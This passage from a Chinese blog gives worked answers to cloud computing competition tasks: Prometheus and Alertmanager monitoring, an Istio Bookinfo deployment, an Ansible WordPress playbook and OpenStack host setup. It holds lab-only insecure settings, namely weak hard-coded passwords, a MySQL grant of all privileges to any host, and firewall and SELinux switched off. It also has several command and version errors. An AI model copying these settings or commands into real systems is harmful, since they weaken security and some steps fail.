<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#授权</span></span><br><span class="line">mysql</span><br><span class="line">&gt;grant <span class="keyword">select</span>,replication client,process ON *.* to <span class="string">&#x27;mysql_monitor&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> identified by <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">&gt;flush privileges;</span><br><span class="line">&gt; quit</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建一个mariadb文件，并写上连接的用户和密码</span></span><br><span class="line">vi /usr/local/mysqld_exporter-0.14.0.linux-amd64/.my.cnf</span><br><span class="line">[client]</span><br><span class="line">user=mysql_monitor</span><br><span class="line">password=123</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动mysqld_exporter</span></span><br><span class="line"><span class="built_in">nohup</span> /usr/local/mysqld_exporter-0.14.0.linux-amd64/mysqld_exporter --config.my-cnf=/usr/local/mysqld_exporter-0.14.0.linux-amd64/.my.cnf &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment">#确认是否开启</span></span><br><span class="line">netstat -nltp | grep 9104</span><br></pre></td></tr></table></figure>

<p><strong>回到master节点</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vi /usr/local/prometheus-2.37.0.linux-amd64/prometheus.yml</span><br><span class="line"> - job_name: <span class="string">&#x27;mysql&#x27;</span></span><br><span class="line">   static_configs:</span><br><span class="line">     - targets: [<span class="string">&#x27;node1:9104&#x27;</span>,<span class="string">&#x27;node2:9104&#x27;</span>]</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line"><span class="comment">#重启服务</span></span><br><span class="line">pkill prometheus</span><br><span class="line"><span class="built_in">nohup</span> /usr/local/prometheus-2.37.0.linux-amd64/prometheus &amp;</span><br></pre></td></tr></table></figure>

<h3 id="2-安装altermanager报警组件"><a href="#2-安装altermanager报警组件" class="headerlink" title="2.安装altermanager报警组件"></a>2.安装altermanager报警组件</h3><p>将提供的alertmanager-0.21.0.linux-amd64.tar.gz上传到prometheus节点 &#x2F;usr&#x2F;local&#x2F; 目录下并解压，创建软连接 alertmanager-0.23.0.linux-amd64&#x2F; alertmanager。创建 service 启动文件，然后启动 alertmanager 查看 9093端口。在 prometheus.yml 配置文件中添加 alertmanager 信息并重新启动 prometheus 服务，在 agent 上停止 node_exporter 服务。到 web 界面中查看警报管理器状态是否正常和 agent 状态是否异常。</p>
<p>将操作命令及截图提交到答题框。</p>
<p><strong>prometheus节点</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">tar -zxvf alertmanager-0.21.0.linux-amd64.tar.gz -C /usr/local/</span><br><span class="line"><span class="built_in">ln</span> -s alertmanager-0.23.0.linux-amd64/ alertmanager</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建service启动文件</span></span><br><span class="line">vi /usr/lib/systemd/system/alertmanager.service</span><br><span class="line">[Unit]</span><br><span class="line">Description=alertmanager</span><br><span class="line">[Service]</span><br><span class="line">ExecStart=/usr/local/alertmanager-0.21.0.linux-amd64/alertmanager --config.file=/usr/local/alertmanager-0.21.0.linux-amd64/alertmanager.yml</span><br><span class="line">ExecReload=/bin/kill -HUP <span class="variable">$MAINPID</span></span><br><span class="line">KillMode=process</span><br><span class="line">Restart=on-failure</span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line"></span><br><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl start alertmanager</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改Prometheus配置文件</span></span><br><span class="line">  - job_name: <span class="string">&#x27;altermanager&#x27;</span></span><br><span class="line">    static_configs:</span><br><span class="line">      - targets: [<span class="string">&#x27;localhost:9093&#x27;</span>]</span><br><span class="line">      </span><br><span class="line">pkill prometheus</span><br><span class="line"><span class="built_in">nohup</span> /usr/local/prometheus/prometheus.yml &amp;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>agent:</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pkill node_exporter</span><br><span class="line"><span class="built_in">nohup</span> /usr/local/node_exporter-1.3.1.linux-amd64/node_exporter &amp;</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\user\AppData\Roaming\Typora\typora-user-images\image-20220922101236256.png" alt="image-20220922101236256"></p>
<h3 id="3-alertmanager-告警邮件文件编写【3-分】"><a href="#3-alertmanager-告警邮件文件编写【3-分】" class="headerlink" title="3.alertmanager 告警邮件文件编写【3 分】"></a>3.alertmanager 告警邮件文件编写【3 分】</h3><p>Prometheus 虚拟机 &#x2F;usr&#x2F;local&#x2F;alertmanager&#x2F; 中存在着一个 alertmanager.yml 文件，请根据提供的地址和模板编写告警所发送到的 email 邮箱地址信息。</p>
<p>将配置文件中编写的内容提交到答题框。 </p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  <span class="attr">smtp_auth_username:</span> <span class="string">&quot;1234567890@qq.com&quot;</span> <span class="comment"># 登录用户名</span></span><br><span class="line">  <span class="attr">smtp_auth_password:</span> <span class="string">&quot;auth_pass&quot;</span> <span class="comment"># 此处的auth password是邮箱的第三方登录授权密码，而非用户密码，尽量用QQ来测试。</span></span><br><span class="line">  <span class="attr">smtp_require_tls:</span> <span class="literal">false</span> <span class="comment"># 有些邮箱需要开启此配置，这里使用的是163邮箱，仅做测试，不需要开启此功能。</span></span><br><span class="line"><span class="attr">route:</span></span><br><span class="line">  <span class="attr">receiver:</span> <span class="string">ops</span></span><br><span class="line">  <span class="attr">group_wait:</span> <span class="string">30s</span> <span class="comment"># 在组内等待所配置的时间，如果同组内，30秒内出现相同报警，在一个组内出现。</span></span><br><span class="line">  <span class="attr">group_interval:</span> <span class="string">5m</span> <span class="comment"># 如果组内内容不变化，合并为一条警报信息，5m后发送。</span></span><br><span class="line">  <span class="attr">repeat_interval:</span> <span class="string">24h</span> <span class="comment"># 发送报警间隔，如果指定时间内没有修复，则重新发送报警。</span></span><br><span class="line">  <span class="attr">group_by:</span> [<span class="string">alertname</span>]  <span class="comment"># 报警分组</span></span><br><span class="line">  <span class="attr">routes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">match:</span></span><br><span class="line">          <span class="attr">team:</span> <span class="string">operations</span></span><br><span class="line">        <span class="attr">group_by:</span> [<span class="string">env</span>,<span class="string">dc</span>]</span><br><span class="line">        <span class="attr">receiver:</span> <span class="string">&#x27;ops&#x27;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">receiver:</span> <span class="string">ops</span> <span class="comment"># 路由和标签，根据match来指定发送目标，如果 rule的lable 包含 alertname， 使用 ops 来发送</span></span><br><span class="line">        <span class="attr">group_wait:</span> <span class="string">10s</span></span><br><span class="line">        <span class="attr">match:</span></span><br><span class="line">          <span class="attr">team:</span> <span class="string">operations</span></span><br><span class="line"><span class="comment"># 接收器指定发送人以及发送渠道</span></span><br><span class="line"><span class="attr">receivers:</span></span><br><span class="line"><span class="comment"># ops分组的定义</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">ops</span></span><br><span class="line">  <span class="attr">email_configs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">to:</span> <span class="string">&#x27;9935226@qq.com,xxxxx@qq.com&#x27;</span> <span class="comment"># 如果想发送多个人就以 &#x27;,&#x27;做分割，写多个邮件人即可。</span></span><br><span class="line">    <span class="attr">send_resolved:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">headers:</span></span><br><span class="line">      <span class="attr">from:</span> <span class="string">&quot;警报中心&quot;</span></span><br><span class="line">      <span class="attr">subject:</span> <span class="string">&quot;[operations] 报警邮件&quot;</span></span><br><span class="line">      <span class="attr">to:</span> <span class="string">&quot;小煜狼皇&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="4-alertmanager-告警规则编写【3-分】"><a href="#4-alertmanager-告警规则编写【3-分】" class="headerlink" title="4.alertmanager 告警规则编写【3 分】"></a>4.alertmanager 告警规则编写【3 分】</h3><p>在 prometheus 虚拟机的 prometheus 路径下存在一个 &#x2F;rules 目录，目录下有一个 node_rules.yml 文件。请根据提供信息仿照模板编写：（1）内存大于 50%报警规则； </p>
<p>（2）cpu 资源利用率大于 75%报警规则； </p>
<p>（3）主机磁盘每秒读取数据&gt;50MB%报警规则； </p>
<p>部门名称可为工位号，将配置文件内容提交到答题框。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">groups:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">node_health</span></span><br><span class="line">  <span class="attr">rules:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">alert:</span> <span class="string">HighMemoryUsage</span></span><br><span class="line">    <span class="attr">expr:</span> <span class="string">node_memory_MemAvailable_bytes</span> <span class="string">/</span> <span class="string">node_memory_MemTotal_bytes</span> <span class="string">&lt;</span> <span class="number">0.5</span></span><br><span class="line">    <span class="attr">for:</span> <span class="string">1m</span></span><br><span class="line">    <span class="attr">labels:</span></span><br><span class="line">      <span class="attr">severity:</span> <span class="string">warning</span></span><br><span class="line">    <span class="attr">annotations:</span></span><br><span class="line">      <span class="attr">summary:</span> <span class="string">High</span> <span class="string">memory</span> <span class="string">usage</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">alert:</span> <span class="string">HighCPUUseage</span></span><br><span class="line">    <span class="attr">expr:</span> <span class="number">1</span><span class="string">-sum(increase(node_cpu_seconds_total&#123;mode=&quot;idle&quot;&#125;[1m]))</span> <span class="string">by</span> <span class="string">(instance)</span> <span class="string">/</span> <span class="string">sum(increase(node_cpu_seconds_total[1m]))</span> <span class="string">by</span> <span class="string">(instance)</span> <span class="string">&gt;</span> <span class="number">0.75</span></span><br><span class="line">    <span class="attr">for:</span> <span class="string">1m</span></span><br><span class="line">    <span class="attr">labels:</span></span><br><span class="line">      <span class="attr">severity:</span> <span class="string">warning</span></span><br><span class="line">    <span class="attr">annotations:</span></span><br><span class="line">      <span class="attr">summary:</span> <span class="string">High</span> <span class="string">CPU</span> <span class="string">usage</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">alert:</span> <span class="string">HighReadTime</span></span><br><span class="line">    <span class="attr">expr:</span> <span class="string">sum(irate(node_disk_read_bytes_total[1m]))</span> <span class="string">by</span> <span class="string">(instance)</span> <span class="string">&gt;</span> <span class="number">50</span></span><br><span class="line">    <span class="attr">for:</span> <span class="string">1m</span></span><br><span class="line">    <span class="attr">labels:</span></span><br><span class="line">      <span class="attr">severity:</span> <span class="string">warning</span></span><br><span class="line">    <span class="attr">annotations:</span></span><br><span class="line">      <span class="attr">summary:</span> <span class="string">High</span> <span class="string">Read</span> <span class="string">Time</span></span><br></pre></td></tr></table></figure>

<h2 id="任务3-企业级微服务运维（13-分）"><a href="#任务3-企业级微服务运维（13-分）" class="headerlink" title="任务3 企业级微服务运维（13 分）"></a>任务3 <strong>企业级微服务运维（13 分）</strong></h2><h3 id="1-在-Kubernetes-集群安装-istio【4-分】"><a href="#1-在-Kubernetes-集群安装-istio【4-分】" class="headerlink" title="1.在 Kubernetes 集群安装 istio【4 分】"></a>1.在 Kubernetes 集群安装 istio【4 分】</h3><p><strong>一定要先安装mertics</strong></p>
<p>将 istio-1.10.1-linux-amd64.tar 上传至 master 节点并解压至&#x2F;root 目录下，将 &#x2F;istio 目录内容器镜像文件上传至各 node 节点中并且加载，完成 istio 初始化安装，将部署成功后三台 POD 状态截图提交答题框。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -zxvf  istio-1.10.1-linux-amd64.tar</span><br><span class="line">cd istio-1.10.1/</span><br><span class="line">cp bin/istionctl /usr/local/bin</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">通过istioctl安装istio</span></span><br><span class="line">istioctl install --set profile=demo</span><br><span class="line">This will install the Istio 1.13.4 demo profile with [&quot;Istio core&quot; &quot;Istiod&quot; &quot;Ingress gateways&quot; &quot;Egress gateways&quot;] components into the cluster. Proceed? (y/N) y</span><br><span class="line">✔ Istio core installed                                                           </span><br><span class="line">✔ Istiod installed                                                               </span><br><span class="line">✔ Egress gateways installed                                                      </span><br><span class="line">✔ Ingress gateways installed                                                     </span><br><span class="line">✔ Installation complete                                                          </span><br><span class="line">Making this installation the default for injection and validation.</span><br></pre></td></tr></table></figure>

<p><strong>完成安装后查看相应服务是否成功启动</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> kubectl get pod -n istio-system</span><br><span class="line"> NAME                                   READY   STATUS    RESTARTS   AGE</span><br><span class="line">istio-egressgateway-5dc6c98fbc-vdlml   1/1     Running   0          3d1h</span><br><span class="line">istio-ingressgateway-87bbdd549-8776n   1/1     Running   0          3d1h</span><br><span class="line">istiod-56b7b78cb5-94c69                1/1     Running   0          3d1h</span><br></pre></td></tr></table></figure>

<h3 id="2-部署基于在线书店-bookinfo【6-分】"><a href="#2-部署基于在线书店-bookinfo【6-分】" class="headerlink" title="2.部署基于在线书店 bookinfo【6 分】"></a>2.部署基于在线书店 bookinfo【6 分】</h3><p>Bookinfo 是一个在线书店微服务应用，Bookinfo 应用分为四个单独的微 </p>
<p>服务：</p>
<p>（1）productpage。这个微服务会调用 details 和 reviews 两个微服务，用来生成页面。</p>
<p>（2）details。 这个微服务中包含了书籍的信息。</p>
<p>（3）reviews。这个微服务中包含了书籍相关的评论。它还会调用 ratings 微服务。</p>
<p>（4）ratings。这个微服务中包含了由书籍评价组成的评级信息。reviews 微服务有 3 个版本：v1 版本不会调用 ratings 服务；v2 版本会 调用 ratings 服务，并使用 1 到 5 个黑色星形图标来显示评分信息；v3 版本会调用 ratings 服务，并使用 1 到 5 个红色星形图标来显示评分信息。实现该应用服务网格的部署，利用 Istio 控制平面为应用提供服务路由、 监控数据收集以及策略实施等功能。部署架构如下：</p>
<p><img src="C:\Users\user\AppData\Roaming\Typora\typora-user-images\image-20220923141709659.png" alt="image-20220923141709659"></p>
<p>（1)编写 Dockerfile 构建 productpage:v1.0 镜像，具体要求如下： </p>
<p>基础镜像：centos:7.9.2009； </p>
<p>安装 Python3.6.8 工具； </p>
<p>安装 productpage 服务并设置开机自启</p>
<p>（2）规划应用微服务部署架构，在容器集群中通过修改微服务应用的 yaml </p>
<p>文件来完成 bookinfo 微服务应用的部署。</p>
<p><strong>边车注入(手动注入)</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">istioctl kube-inject -f samples/bookinfo/platform/kube/bookinfo.yaml -o samples/bookinfo/platform/kube/bookinfo-istio.yaml</span><br></pre></td></tr></table></figure>

<p>（3）在容器集群中设置熔断规则，对 Bookinfo 其中的 productpage 微服务设置熔断规则，并通过负载 fortio 测试客户端触发熔断机制进行验证。</p>
<p><strong>vi destinationrule.yaml</strong></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">networking.istio.io/v1beta1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">DestinationRule</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">productpage</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">host:</span> <span class="string">productpage</span></span><br><span class="line">  <span class="attr">trafficPolicy:</span></span><br><span class="line">    <span class="attr">connectionPool:</span></span><br><span class="line">      <span class="attr">tcp:</span></span><br><span class="line">        <span class="attr">maxConnections:</span> <span class="number">1</span></span><br><span class="line">      <span class="attr">http:</span></span><br><span class="line">        <span class="attr">http1MaxPendingRequests:</span> <span class="number">1</span></span><br><span class="line">        <span class="attr">maxRequestsPerConnection:</span> <span class="number">1</span></span><br><span class="line">    <span class="attr">outlierDetection:</span></span><br><span class="line">      <span class="attr">consecutive5xxErrors:</span> <span class="number">1</span></span><br><span class="line">      <span class="attr">interval:</span> <span class="string">1s</span></span><br><span class="line">      <span class="attr">baseEjectionTime:</span> <span class="string">3m</span></span><br><span class="line">      <span class="attr">maxEjectionPercent:</span> <span class="number">100</span></span><br></pre></td></tr></table></figure>

<p><strong>部署fortio文件进行访问测试</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl apply -f samples/httpbin/sample-client/fortio-deploy.yaml</span><br><span class="line"></span><br><span class="line">kubectl exec fortio-deploy-5bb66f84-rpck8  -c fortio -- /usr/bin/fortio load  -qps 0 -n 200 -loglevel Warning  http://productpage:9080/</span><br></pre></td></tr></table></figure>

<h3 id="3-部署网关接口实现对外服务【3-分】"><a href="#3-部署网关接口实现对外服务【3-分】" class="headerlink" title="3.部署网关接口实现对外服务【3 分】"></a>3.部署网关接口实现对外服务【3 分】</h3><p>通过 istio-1.10.1&#x2F;samples&#x2F;bookinfo&#x2F;networking&#x2F;bookinfo-gateway.yaml 部署 bookinfo 网关，通过外部浏览器登陆 bookinfo，请将浏览器反馈的结果截图提交答题框.。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl apply -f istio-1.10.1/samples/bookinfo/networking/bookinfo-gateway.yaml</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将istio-system空间的istio-ingressgateway 的svc中</span></span><br><span class="line">kubectl edit istio-ingressgateway -n istio-system</span><br><span class="line">改为NodePort</span><br></pre></td></tr></table></figure>

<p><strong>进行访问</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.200.155:30221/productpage</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>云计算</category>
        <category>技能大赛汇总</category>
      </categories>
      <tags>
        <tag>云计算</tag>
        <tag>云计算职业技能大赛</tag>
      </tags>
  </entry>
  <entry>
    <title>云计算方向-Ansible搭建wordpress</title>
    <url>/posts/944d69ee.html</url>
    <content><![CDATA[<h1 id="一-ansible搭建wordpress"><a href="#一-ansible搭建wordpress" class="headerlink" title="一.ansible搭建wordpress"></a>一.ansible搭建wordpress</h1><p><strong>基于lamp构建wordpress</strong></p>
<table>
<thead>
<tr>
<th>master</th>
<th>192.168.200.100</th>
<th>控制节点</th>
</tr>
</thead>
<tbody><tr>
<td>node1</td>
<td>192.168.200.101</td>
<td>web服务器</td>
</tr>
<tr>
<td>node2</td>
<td>192.168.200.102</td>
<td>mysql服务器</td>
</tr>
</tbody></table>
<p><strong>vi &#x2F;etc&#x2F;ansible&#x2F;host</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[master]</span><br><span class="line">master</span><br><span class="line">[web]</span><br><span class="line">192.168.200.101</span><br><span class="line">node1</span><br><span class="line">[database]</span><br><span class="line">192.168.200.102</span><br><span class="line">node2</span><br></pre></td></tr></table></figure>

<p><strong>vi wordpress.yaml</strong></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="comment"># hosts: 后面可写主机组名或主机名</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">hosts:</span> <span class="string">all</span></span><br><span class="line">  <span class="attr">remote_user:</span> <span class="string">root</span></span><br><span class="line">  <span class="comment"># 定义变量</span></span><br><span class="line">  <span class="attr">vars:</span></span><br><span class="line">    <span class="attr">db_pkgs:</span></span><br><span class="line">      <span class="comment"># 以下的-为变量“值”，也就是在引用db_pkgs变量时，可取变量中的值</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">mariadb</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">mariadb-server</span></span><br><span class="line">    <span class="attr">web_pkgs:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">httpd</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">php</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">php-gd</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">php-mysql</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">gd</span></span><br><span class="line">  <span class="comment"># tasks：ansible机器要执行操作的任务列表（依次执行）</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="comment"># 安装mariadb</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">install</span> <span class="string">mariadb</span></span><br><span class="line">    <span class="comment"># 引用变量时使用&#123;&#123;&#125;&#125;</span></span><br><span class="line">      <span class="attr">yum:</span> <span class="string">name=&#123;&#123;</span> <span class="string">db_pkgs</span> <span class="string">&#125;&#125;</span> <span class="string">state=latest</span></span><br><span class="line">      <span class="attr">when:</span> <span class="string">ansible_nodename</span> <span class="string">==</span> <span class="string">&#x27;node2&#x27;</span></span><br><span class="line">    <span class="comment"># 安装webserver相关服务（httpd、php）</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">install</span> <span class="string">webserver</span></span><br><span class="line">      <span class="attr">yum:</span> <span class="string">name=&#123;&#123;</span> <span class="string">web_pkgs</span> <span class="string">&#125;&#125;</span> <span class="string">state=latest</span></span><br><span class="line">      <span class="attr">when:</span> <span class="string">ansible_nodename</span> <span class="string">==</span> <span class="string">&#x27;node1&#x27;</span></span><br><span class="line">    <span class="comment"># 启动mariadb</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">start</span> <span class="string">mariadb</span></span><br><span class="line">      <span class="attr">service:</span> <span class="string">name=mariadb</span> <span class="string">state=started</span></span><br><span class="line">      <span class="comment"># 触发（类似c语言的中断信号），触发后会去handlers执行相关操作</span></span><br><span class="line">      <span class="attr">notify:</span> <span class="string">create_db</span></span><br><span class="line">      <span class="comment"># when判断，用来针对某主机执行的操作，比如这里是指定对database组里的机器进行操作</span></span><br><span class="line">      <span class="attr">when:</span> <span class="string">ansible_nodename</span> <span class="string">==</span> <span class="string">&#x27;node2&#x27;</span></span><br><span class="line">    <span class="comment"># 启动webserver相关服务</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">start</span> <span class="string">webserver</span></span><br><span class="line">      <span class="attr">service:</span> <span class="string">name=httpd</span> <span class="string">state=started</span></span><br><span class="line">      <span class="attr">when:</span> <span class="string">ansible_nodename</span> <span class="string">==</span> <span class="string">&#x27;node1&#x27;</span></span><br><span class="line">    <span class="comment"># 将项目包发送到指定机器（及解包）  </span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">to</span> <span class="string">package</span></span><br><span class="line">      <span class="attr">unarchive:</span> <span class="string">src=/root/wordpress-4.9.18-zh_CN.tar.gz</span> <span class="string">dest=/var/www/html</span></span><br><span class="line">      <span class="attr">when:</span> <span class="string">ansible_nodename</span> <span class="string">==</span> <span class="string">&#x27;node1&#x27;</span></span><br><span class="line">    <span class="comment"># 修改指定机器网站发布目录属组/主</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">chown</span></span><br><span class="line">      <span class="attr">file:</span> <span class="string">owner=apache</span> <span class="string">group=apache</span> <span class="string">recurse=yes</span> <span class="string">path=var/www/html</span></span><br><span class="line">      <span class="attr">when:</span> <span class="string">ansible_nodename</span> <span class="string">==</span> <span class="string">&#x27;node1&#x27;</span></span><br><span class="line">  <span class="comment"># 触发操作    </span></span><br><span class="line">  <span class="attr">handlers:</span></span><br><span class="line">    <span class="comment"># 注意：这里的name名字必须和notify的触发名称保持一致</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">create_db</span></span><br><span class="line">      <span class="comment"># 调用shell解释器执行相关命令</span></span><br><span class="line">      <span class="attr">shell:</span> <span class="string">mysql</span> <span class="string">-e</span> <span class="string">&quot;create database wordpress;grant all on *.* to &#x27;zrs&#x27;@&#x27;%&#x27; identified by &#x27;015210&#x27;;flush privileges;&quot;</span></span><br><span class="line">      <span class="comment"># 同样这里是针对database这个主机组里的机器</span></span><br><span class="line">      <span class="attr">when:</span> <span class="string">ansible_nodename</span> <span class="string">==</span> <span class="string">&#x27;node2&#x27;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>云计算</category>
        <category>技能大赛汇总</category>
      </categories>
      <tags>
        <tag>云计算</tag>
        <tag>云计算职业技能大赛</tag>
      </tags>
  </entry>
  <entry>
    <title>云计算方向-2023年金砖大赛山东选拔题</title>
    <url>/posts/840d388d.html</url>
    <content><![CDATA[<h1 id="A场次题目：OpenStack平台部署与运维"><a href="#A场次题目：OpenStack平台部署与运维" class="headerlink" title="A场次题目：OpenStack平台部署与运维"></a>A场次题目：OpenStack平台部署与运维</h1><p>业务场景：</p>
<p>某企业拟使用OpenStack搭建一个企业云平台，用于部署各类企业应用对外对内服务。云平台可实现IT资源池化，弹性分配，集中管理，性能优化以及统一安全认证等。系统结构如下图：</p>
<p>企业云平台的搭建使用竞赛平台提供的两台云服务器，配置如下表：</p>
<table>
<thead>
<tr>
<th>设备名称</th>
<th>主机名</th>
<th>接口</th>
<th>ip地址</th>
</tr>
</thead>
<tbody><tr>
<td>云服务器1</td>
<td>controller</td>
<td>eth0，eth1</td>
<td>私网：192.168.100.10&#x2F;24           私网：192.168.200.10&#x2F;24</td>
</tr>
<tr>
<td>云服务器2</td>
<td>compute</td>
<td>eth0，eth1</td>
<td>私网：192.168.100.20&#x2F;24         私网：192.168.200.20&#x2F;24</td>
</tr>
</tbody></table>
<p>说明:</p>
<p>1.选手自行检查工位pc机硬件及网络是否正常;1.选手自行检查工位PC机硬件及网络是否正常；</p>
<p>⒉.竞赛使用集群模式进行，给每个参赛队提供华为云账号和密码及考试系统的账号和密码。选手通过用户名与密码分别登录华为云和考试系统;</p>
<p>3.考试用到的软件包都在云主机&#x2F;opt下。3.考试用到的软件包都在云主机&#x2F;OPT下.</p>
<p>4.表1中的公网IP和私网IP以自己云主机显示为准，每个人的公网IP和私网IP不同。使用第三方软件远程连接云主机，使用公网IP连接。4.表1中的公网IP和私网IP以自己云主机显示为准，每个人的公网IP和私网IP不同。使用第三方软件远程连接云主机，使用公网IP连接.</p>
<h2 id="任务1私有云平台环境初始化-5分"><a href="#任务1私有云平台环境初始化-5分" class="headerlink" title="任务1私有云平台环境初始化(5分)"></a>任务1私有云平台环境初始化(5分)</h2><h3 id="1-初始化操作系统"><a href="#1-初始化操作系统" class="headerlink" title="1.初始化操作系统"></a>1.初始化操作系统</h3><p>控制节点主机名为controller，计算节点主机名为compute，修改hosts文件将IP地址映射为主机名，使用一条命令关闭firewalld并设置开机不自动启动。</p>
<p>请将cat &#x2F;etc&#x2F;hosts命令的返回结果提交至答题框。【2分】</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/hosts</span><br><span class="line">192.168.100.10 controller</span><br><span class="line">192.168.100.20 compute</span><br></pre></td></tr></table></figure>

<p><strong>过程：</strong></p>
<p><strong>controller节点</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hostnamectl set-hostname controller</span><br><span class="line"><span class="comment">#修改主机映射</span></span><br><span class="line">vi /etc/hosts</span><br><span class="line">192.168.100.10 controller</span><br><span class="line">192.168.100.20 compute</span><br><span class="line"></span><br><span class="line"><span class="comment">#关闭防火墙和关机自启动</span></span><br><span class="line">systemctl stop firewalld &amp;&amp; systemctl <span class="built_in">disable</span> firewalld</span><br><span class="line"><span class="comment">#安全策略</span></span><br><span class="line">setenforce 0</span><br><span class="line">vi /etc/selinux/config</span><br><span class="line">SELINUX=permissive</span><br></pre></td></tr></table></figure>

<p><strong>compute节点</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hostnamectl set-hostname compute</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改主机映射</span></span><br><span class="line">vi /etc/hosts</span><br><span class="line">192.168.100.10 controller</span><br><span class="line">192.168.100.20 compute</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">关闭防火墙和关机自启动</span></span><br><span class="line">systemctl stop firewalld &amp;&amp; systemctl disable firewalld</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">安全策略</span></span><br><span class="line">setenforce 0</span><br><span class="line">vi /etc/selinux/config</span><br><span class="line">SELINUX=permissive</span><br></pre></td></tr></table></figure>

<h3 id="⒉-挂载安装光盘镜像"><a href="#⒉-挂载安装光盘镜像" class="headerlink" title="⒉.挂载安装光盘镜像"></a>⒉.挂载安装光盘镜像</h3><p>将提供的CentOS-7-x86_64-DVD-1804.iso和bricsskills_cloud_iaas.iso光盘镜像复制到controller节点&#x2F;root目录下，然后在&#x2F;opt目录下使用命令创建&#x2F;centos目录和&#x2F;iaas目录，并将镜像文件centOS-7-x86_64-DVD-1804.iso挂载到&#x2F;centos目录下，将镜像文件bricsskills_cloud_iaas.iso挂载到&#x2F;iaas目录下</p>
<p>请将ls &#x2F;opt&#x2F;iaas&#x2F;命令的返回结果提交至答题框。【1分】</p>
<p>(镜像未拷贝，用省赛即可)</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# <span class="built_in">ls</span> /opt/iaas/</span><br><span class="line">iaas-repo  images</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>过程：</strong></p>
<p><strong>controller节点</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建目录 </span></span><br><span class="line"><span class="built_in">mkdir</span> /opt/centos</span><br><span class="line"><span class="built_in">mkdir</span> /opt/iaas</span><br><span class="line"></span><br><span class="line"><span class="comment">#镜像挂载</span></span><br><span class="line">mount CentOS-7-x86_64-DVD-1804.iso /opt/centos/</span><br><span class="line">mount chinaskills_cloud_iaas.iso /opt/iaas/</span><br></pre></td></tr></table></figure>

